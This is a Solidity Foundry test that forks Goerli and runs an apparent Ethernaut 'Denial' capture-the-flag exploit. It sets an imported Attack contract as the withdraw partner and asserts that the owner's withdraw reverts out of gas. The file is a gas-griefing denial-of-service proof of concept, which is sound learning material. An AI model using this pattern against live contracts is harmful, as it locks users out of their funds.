// SPDX-License-Identifier: MIT
pragma solidity ^0.8.12;

import "forge-std/Test.sol";
import "../src/Denial.sol";
import "../src/Attack.sol";

contract DenialTestFork is Test {

    string constant  PROJECT_ID = "PROJECT_ID";
    address payable constant denialAddr = payable(0x41c98A91568513229949638b4db15Bb7D4090F90);

    Denial public denialCtr;
    Attack public attackCtr;

    function setUp() public {
        fork(9_211_370);

        denialCtr = (Denial)(denialAddr);
        attackCtr = new Attack();

        prepare();
    }

    function fork(uint ublock) private {
        string memory infuraId = vm.envString(PROJECT_ID);
        console.log(PROJECT_ID, infuraId);

        string memory url = string.concat("https://goerli.infura.io/v3/", infuraId);
        console.log("URL", url);

        uint goerliFork = vm.createFork(url);
        vm.selectFork(goerliFork);
        vm.rollFork(ublock);
    }

    function prepare() public {
        // Set Attack contract as the partner
        denialCtr.setWithdrawPartner(address(attackCtr));
        assertEq(address(attackCtr), denialCtr.partner());

        //Give some credit to the Denial contract
        uint256 amountToSend = 1 gwei;
        bool    res;

        console.log("Denial Balance Start: ", address(denialCtr).balance);
        (res,  ) = address(denialCtr).call{value:amountToSend}("");        
        assertTrue(res);
        console.log("Denial Balance End:   ", address(denialCtr).balance);
    }

    // forge test --match-contract DenialTestFork --match-test test_BlockTransfers -vvvv
    function test_BlockTransfers() public {

        // Test withdrawing
        uint256 ownerBalanceSt = denialCtr.owner().balance;
        console.log("Owner Balance Start: ", ownerBalanceSt);

        //Expect EvmError: OutOfGas
        // https://github.com/foundry-rs/foundry/issues/4012
        // https://book.getfoundry.sh/cheatcodes/expect-revert?highlight=expectRevert#expectrevert
        vm.expectRevert(bytes(""));
        denialCtr.withdraw{gas: 1000000}();

        uint256 ownerBalanceEn = denialCtr.owner().balance;
        console.log("Owner Balance Start: ", ownerBalanceEn);
        
        assertEq(ownerBalanceSt,ownerBalanceEn);
    }    
    
}